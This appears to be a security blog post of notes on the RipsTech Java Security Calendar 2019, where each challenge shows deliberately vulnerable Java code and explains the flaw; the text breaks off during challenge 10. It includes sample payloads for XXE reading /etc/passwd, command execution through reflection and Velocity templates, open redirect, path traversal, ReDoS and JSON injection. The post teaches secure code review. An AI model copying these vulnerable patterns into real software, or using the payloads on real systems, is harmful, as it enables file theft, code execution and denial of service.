<!DOCTYPE html>









<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en"
  
    data-mode="light"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="RipsTech Java Security Calendar 2019 Notes" />
<meta name="author" content="snoopysecurity" />
<meta property="og:locale" content="en" />
<meta name="description" content="Notes related to RipsTech PHP Security Calendar 2019 which aren‚Äôt accessible anymore." />
<meta property="og:description" content="Notes related to RipsTech PHP Security Calendar 2019 which aren‚Äôt accessible anymore." />
<link rel="canonical" href="http://localhost:4000/posts/ripstech-java-advent-calendar/" />
<meta property="og:url" content="http://localhost:4000/posts/ripstech-java-advent-calendar/" />
<meta property="og:site_name" content="üíª Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-01-08T03:25:52+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="RipsTech Java Security Calendar 2019 Notes" />
<meta name="twitter:site" content="@snoopysecurity" />
<meta name="twitter:creator" content="@snoopysecurity" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"snoopysecurity"},"dateModified":"2020-01-08T03:25:52+08:00","datePublished":"2020-01-08T03:25:52+08:00","description":"Notes related to RipsTech PHP Security Calendar 2019 which aren‚Äôt accessible anymore.","headline":"RipsTech Java Security Calendar 2019 Notes","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/ripstech-java-advent-calendar/"},"url":"http://localhost:4000/posts/ripstech-java-advent-calendar/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>RipsTech Java Security Calendar 2019 Notes | üíª | Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="üíª | Blog">
<meta name="application-name" content="üíª | Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.1/dist/jquery.min.js"></script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="/assets/img/blog/pic1.jpeg" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title">
      <a href="/">üíª | Blog</a>
    </div>
    <div class="site-subtitle font-italic">learning security while segfaulting through life</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    

    
      

      
      <a href="https://github.com/snoopysecurity" aria-label="github"
        
        
          
          target="_blank"
        

        

        rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/snoopysecurity" aria-label="twitter"
        
        
          
          target="_blank"
        

        

        rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['example','domain.com'].join('@')" aria-label="email"
        
        

        

        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        
        

        

        >
        <i class="fas fa-rss"></i>
      </a>
      

    
      

      
      <a href="" aria-label="linkedin"
        
        
          
          target="_blank"
        

        

        rel="noopener">
        <i class="fab fa-linkedin"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>RipsTech Java Security Calendar 2019 Notes</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">
        





<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->


<!-- images -->





<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  




<!-- return -->

<h1 data-toc-skip>RipsTech Java Security Calendar 2019 Notes</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Posted
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1578425152"
    data-df="ll"
    data-toggle="tooltip" data-placement="bottom">
  Jan  8, 2020
</em>

    </span>

    <!-- lastmod date -->
    

  

  <div class="d-flex justify-content-between">
    <!-- author(s) -->
    <span>
      

      By

      <em>
      
        
          <a href=""></a>
          
        
      
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="5974 words">
  <em>33 min</em> read</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>Notes related to RipsTech PHP Security Calendar 2019 which aren‚Äôt accessible anymore.</p>

<h3 id="challenge-1---candy-cane"><span class="mr-2">Challenge 1 - Candy Cane</span><a href="#challenge-1---candy-cane" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre>import org.jdom2.Content;
import org.jdom2.Document;
import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;

public class ImportDocument {
  // This function extracts the text of an OpenOffice document
  public static String extractString() throws IOException, JDOMException {
    File initialFile = new File("uploaded_office_doc.odt");
    InputStream in = new FileInputStream(initialFile);
    final ZipInputStream zis = new ZipInputStream(in);
    ZipEntry entry;
    List&lt;Content&gt; content = null;
    while ((entry = zis.getNextEntry()) != null) {
      if (entry.getName().equals("content.xml")) {
        final SAXBuilder sax = new org.jdom2.input.SAXBuilder();
        sax.setFeature("http://javax.xml.XMLConstants/feature/secure-processing",true);
        Document doc = sax.build(zis);
        content = doc.getContent();
        zis.close();
        break;
      }
    }
    StringBuilder sb = new StringBuilder();
    if (content != null) {
      for(Content item : content){
        sb.append(item.getValue());
      }
    }
    return sb.toString();
  }
}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>The extractString function opens an OpenOffice document uploaded by an attacker to extract its text.</li>
  <li>OpenOffice documents are ZIP files containing multiple resources.</li>
  <li>One of these resources is content.xml, which holds the text information in XML format.</li>
  <li>The file content.xml is processed by the method org.jdom2.input.SAXBuilder.build(), which is vulnerable to XXE injection.</li>
  <li>The XXE vulnerability can be exploited by adding a malicious DOCTYPE declaration to the XML document.</li>
  <li>The XXE entity can reference sensitive files, such as /etc/passwd, and insert their contents into the document.</li>
</ul>

<p>Example payload:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT text ANY &gt;
&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
</pre></td></tr></tbody></table></code></div></div>

<h3 id="challenge-2---eggnog-madness"><span class="mr-2">Challenge 2 - Eggnog Madness</span><a href="#challenge-2---eggnog-madness" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre></td><td class="rouge-code"><pre>import org.json.*;

public class MainController{
  private static String[] parseJsonAsArray(String rawJson, String field) {
    JSONObject obj = new JSONObject(rawJson);
    JSONArray arrJson = obj.getJSONArray(field);
    String[] arr = new String[arrJson.length()];
    for (int i = 0; i &lt; arrJson.length(); i++) {
      arr[i] = arrJson.getString(i);
    }
    return arr;
  }

  private static String parseJsonAsString(String rawJson, String field) {
    JSONObject obj = new JSONObject(rawJson);
    return obj.getString(field);
  }

  // rawJson is user-controlled.
  public MainController(String rawJson) {
    this(parseJsonAsString(rawJson, "controller"), parseJsonAsString(rawJson, "task"), parseJsonAsArray(rawJson, "data"));
  }

  private MainController(String controllerName, String task, String... data) {
    try {
      Object controller = !controllerName.equals("MainController") ? Class.forName(controllerName).getConstructor(String[].class).newInstance((Object) data) : this;
      System.out.println(controller.getClass().getMethod(task));
      controller.getClass().getMethod(task).invoke(controller);
    } catch (Exception e1) {
      try {
        String log = "# [ERROR] Exception with data: " + data + " with exception " + e1;
        System.err.println(log);
        // DONE: VulnApp Security Bug #23517: Strip all "dots" so file extension does not lead to RCE
        Runtime.getRuntime().exec(new String[]{"java", "-jar", "log4j_custom_dlogger.jar", log.replaceAll(".", "")});
        // TODO: VulnApp Bug #24630: Logging is currently not working in v1.8,
        //       something with an ArgumentException, please have alook at that @peter
      } catch (Exception e2) {
        System.err.println("FATAL ERROR: " + e2);
      }
    }
  }
}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>The rawJson parameter in line 20 is user-controlled and parsed as JSON.</li>
  <li>Data extracted from the JSON string is passed to the second constructor in line 21.</li>
  <li>The parameters controllerName and data can be exploited to instantiate any object and control the first parameter of a constructor in line 26.</li>
  <li>In line 28, the task parameter is used as a function name executed on the previously created object.</li>
  <li>This allows an attacker to instantiate objects, control the constructor‚Äôs first argument, and invoke any parameterless function.</li>
  <li>For exploitation, an attacker can create a ProcessBuilder with a shell command like touch hacked.jsp and then call the start() function to execute the command:
<code class="language-plaintext highlighter-rouge">rawJson={"controller":"java.lang.ProcessBuilder","task":"start","data":["touch","hacked.jsp"]}</code></li>
  <li>The ‚Äúlogging‚Äù code in line 31 is a distraction and not vulnerable.</li>
</ul>

<h3 id="challenge-3---christmas-carols"><span class="mr-2">Challenge 3 - Christmas Carols</span><a href="#challenge-3---christmas-carols" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre>import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.velocity.app.VelocityEngine;
import org.apache.velocity.VelocityContext;
import java.util.HashMap;
import java.util.Map;

public class TemplateRenderer {
  private final VelocityEngine velocity;

  public String renderFragment(String fragment, Map&lt;String,Object&gt; contextParameters) {
    velocity = new VelocityEngine();
    velocity.init();
    VelocityContext context =  new VelocityContext(contextParameters);
    StringWriter tempWriter = new StringWriter(fragment.length());
    velocity.evaluate(context, tempWriter, "renderFragment", fragment);
    return tempWriter.toString();
  }

  public String render(HttpServletRequest req, HttpServletResponse res) {
    Map&lt;String, Object&gt; hm = new HashMap&lt;String, Object&gt;();
    hm.put("user", req.getParameter("user"));
    String template = req.getParameter("temp");
    String rendered = renderFragment(template,hm);
    res.getWriter().println(rendered);
  }
}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>A temp parameter is received and passed to renderFragment().</li>
  <li>The fragment argument leads to a Code Injection vulnerability in the Velocity template.</li>
  <li>The fragment (template) is evaluated as Java code by Velocity.</li>
  <li>Direct Java code execution is limited.</li>
  <li>Java reflection can be used to access Java classes and execute shell commands.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>user=&amp;temp=#set($s="")#set($stringClass=$s.getClass()
   .forName("java.lang.Runtime").getRuntime()
   .exec("touch hacked.jsp"))$stringClass
</pre></td></tr></tbody></table></code></div></div>

<h3 id="challenge-4---father-christmas"><span class="mr-2">Challenge 4 - Father Christmas</span><a href="#challenge-4---father-christmas" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>import javax.servlet.http.*;

public class Login extends HttpServlet {
  protected void doPost(HttpServletRequest request,
                        HttpServletResponse response) {
    String url = request.getParameter("url");
    //only relative urls are allowed!
    if (url.startsWith("/")) {
      response.sendRedirect(url);
    }
  }
}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>This code challenge receives user input via the GET or POST parameter url.</li>
  <li>The url parameter can be used to exploit an open redirect vulnerability.</li>
  <li>The redirect happens if url starts with /.</li>
  <li>However, a URI starting with 2 slashes ( //attacker.org ) is not a relative URI but an absolute URI without a scheme. Therefore, the intended check if the URI is relative can be bypassed with the url parameter //attacker.org.</li>
  <li>As a result, the server redirects the victim to attacker.org.</li>
</ul>

<h3 id="challenge-5---wintertime"><span class="mr-2">Challenge 5 - WinterTime</span><a href="#challenge-5---wintertime" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre>import javax.servlet.http.HttpServletRequest;
import java.util.Enumeration;

public class Request {
  public static String toString(HttpServletRequest req) {
    StringBuilder sb = new StringBuilder();
    String delimiter = req.getParameter("delim");
    Enumeration&lt;String&gt; names = req.getParameterNames();
    while (names.hasMoreElements()) {
      String name = names.nextElement();
      if (!name.equals("delim")) {
        sb.append("&lt;b&gt;" + name + "&lt;/b&gt;:&lt;br&gt;");
        String[] values = req.getParameterValues(name);
        for (String val : values) {
          sb.append(val);
          sb.append(delimiter);
          sb.append("&lt;br&gt;");
        }
      }
    }
    return sb.toString();
  }
}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>The function toString iterates over HTTP parameters and formats them into HTML representation.</li>
  <li>The value delimiter is received and appended to the StringBuilder instance after each parameter value.</li>
  <li>A denial of service issue may arise due to the internals of java.util.StringBuilder.</li>
  <li>The StringBuilder object is initialized with an array of size 16.</li>
  <li>Each time a new value is appended, the StringBuilder instance checks if the data fits into the array.</li>
  <li>If not, the size of the array is doubled, leading to large amplification.</li>
  <li>Apache Tomcat has a 2MB limit for POST requests and a maximum of 10000 parameters.</li>
  <li>By submitting a large value for parameter delim and multiple HTTP parameters, we can exploit the StringBuilder internals to cause a maximum amplification of ~20000.</li>
</ul>

<h3 id="challenge-6---yule"><span class="mr-2">Challenge 6 - Yule</span><a href="#challenge-6---yule" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>import java.io.*;
import java.nio.file.*;
import javax.servlet.http.*;

public class ReadFile extends HttpServlet {
  protected void doPost(HttpServletRequest request,
                        HttpServletResponse response) throws IOException {
    try {
      String url = request.getParameter("url");
      String data = new String(Files.readAllBytes(Paths.get(url)));
    } catch (IOException e) {
      PrintWriter out = response.getWriter();
      out.print("File not found");
      out.flush();
    }
    //proceed with code
  }
}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>Untrusted user input is received from the parameter url.</li>
  <li>A java.nio.file.Path instance is created from the given value.</li>
  <li>The contents of the file are read by the method java.nio.file.Files.readAllBytes().</li>
  <li>This can be used to read arbitrary files through path traversal.</li>
  <li>The file contents are not reflected in the response.</li>
  <li>By sending the value /dev/urandom, the application can be interrupted.</li>
  <li>The method Files.readAllBytes() will not terminate until the Java heap is out of memory.</li>
  <li>This leads to an infinite file read and memory exhaustion (DoS).</li>
  <li>The IOException handler does not catch this issue.</li>
</ul>

<h3 id="challenge-7---jingle-bells"><span class="mr-2">Challenge 7 - Jingle Bells</span><a href="#challenge-7---jingle-bells" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre>import com.fasterxml.jackson.core.*;
import javax.servlet.http.*;
import java.io.*;

public class ApiCache extends HttpServlet {
  protected void doPost(HttpServletRequest request,
                        HttpServletResponse response) throws IOException {
    storeJson(request, "/tmp/getUserInformation.json");
  }

  protected void doGet(HttpServletRequest request,
                       HttpServletResponse response) {
    loadJson();
  }

  public static void loadJson() {
      // Deserialize to an HashMap object with Jackson's JsonParser and read the first 2 entries of the file.
  }

  public static void storeJson(HttpServletRequest request, String filename) throws IOException {
    JsonFactory jsonobject = new JsonFactory();
    JsonGenerator jGenerator = jfactory.createGenerator(new File(filename), JsonEncoding.UTF8);
    jGenerator.writeStartObject();
    jGenerator.writeFieldName("username");
    jGenerator.writeRawValue("\"" + request.getParameter("username") + "\"");
    jGenerator.writeFieldName("permission");
    jGenerator.writeRawValue("\"none\"");
    jGenerator.writeEndObject();
    jGenerator.close();
  }
}
</pre></td></tr></tbody></table></code></div></div>
<ul>
  <li>The username parameter is user-controlled and flows into jGenerator.writeRawValue() without sanitization.</li>
  <li>An attacker could inject the payload ?username=foo‚Äù,‚Äùpermission‚Äù:‚Äùall.</li>
  <li>This results in a JSON object with duplicate keys: ‚Äúpermission‚Äù:‚Äùall‚Äù and ‚Äúpermission‚Äù:‚Äùnone‚Äù.</li>
  <li>If the JSON object is deserialized in method loadJson() and the method only deserializes the first occurrence of each key, the user foo can escalate privileges to ‚Äúall‚Äù.</li>
  <li>Successful exploitation depends on the implementation of loadJson().</li>
</ul>

<h3 id="challenge-8---icicles"><span class="mr-2">Challenge 8 - Icicles</span><a href="#challenge-8---icicles" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td><td class="rouge-code"><pre>import java.io.File;
import javax.servlet.http.*;

public class GetPath extends HttpServlet {
  protected void doGet(HttpServletRequest request,
                       HttpServletResponse response) throws IOException {
    try {
      String icons = request.getParameter("icons");
      String filename = request.getParameter("filename");

      File f_icons = new File(icons);
      File f_filename = new File(filename);

      if (!icons.equals(f_icons.getName())) {
        throw new Exception("File not within target directory!");
      }

      if (!filename.equals(f_filename.getName())) {
        throw new Exception("File not within target directory!");
      }

      String toDir = "/var/myapp/data/" + f_icons.getName() + "/";
      File file = new File(toDir, filename);

      // Download file...
    } catch(Exception e) {
      response.sendRedirect("/");
    }
  }
}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>The parameter icons flows into a File object.</li>
  <li>It is validated and concatenated into a file path.</li>
  <li>The check in line 14 tries to prevent path traversal by comparing the file name to the parameter icons.</li>
  <li>The method getName() turns input like /../../../foo.txt into foo.txt, preventing simple path traversal.</li>
  <li>However, input like .. is not removed by getName().</li>
  <li>This allows bypassing the security check.</li>
  <li>In combination with the parameter filename, we can traverse one directory level higher and download arbitrary files.</li>
</ul>

<h3 id="challenge-9---chestnuts"><span class="mr-2">Challenge 9 - Chestnuts</span><a href="#challenge-9---chestnuts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre>import java.io.*;
import java.util.regex.*;
import javax.servlet.http.*;

public class Validator extends HttpServlet {
  protected void doPost(HttpServletRequest request,
                        HttpServletResponse response) throws IOException {
    response.setContentType("text/plain");
    response.setCharacterEncoding("UTF-8");

    PrintWriter out = response.getWriter();
    if (isInWhiteList(request.getParameter("whitelist"), request.getParameter("value"))) {
      out.print("Value is in whitelist.");
    } else {
      out.print("Value is not in whitelist.");
    }
    out.flush();
  }

  public static boolean isInWhiteList(String whitelist, String value) {
    Pattern pattern = Pattern.compile("^[" + whitelist + "]+");
    Matcher matcher = pattern.matcher(value);
    return matcher.matches();
  }
}
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>The parameter whitelist controls a part of the regular expression pattern.</li>
  <li>The parameter value is validated against this expression.</li>
  <li>We can inject an arbitrary expression and control the value it‚Äôs matched against.</li>
  <li>This allows us to produce heavy CPU consumption with a complex regular expression (ReDoS).</li>
  <li>This can lead to CPU exhaustion and a DoS, especially in Java 8.</li>
  <li>Proof of Concept: <code class="language-plaintext highlighter-rouge">whitelist=x]|((((a+)+)+)+)&amp;value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code></li>
</ul>

<h3 id="challenge-10---anticipation"><span class="mr-2">Challenge 10 - Anticipation</span><a href="#challenge-10---anticipation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>@RequestMapping("/webdav")
  public void webdav(HttpServletResponse res, @RequestParam("name") String name) throws IOException {
    res.setContentType("text/xml");
    res.setCharacterEncoding("UTF-8");
    PrintWriter pw = res.getWriter();
    name = name.replace("]]", "");
    pw.print("&lt;person&gt;");
    pw.print("&lt;name&gt;&lt;![CDATA[" + name.replace(" ","") + "]]&gt;&lt;/name&gt;");
    pw.print("&lt;/person&gt;");
  }
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>User input from parameter ‚Äúname‚Äù is mapped to function parameter ‚Äúname‚Äù via @RequestParam.</li>
  <li>The response Content-Type is set to text/xml.</li>
  <li>Untrusted user input can be injected into the XML response, leading to XSS.</li>
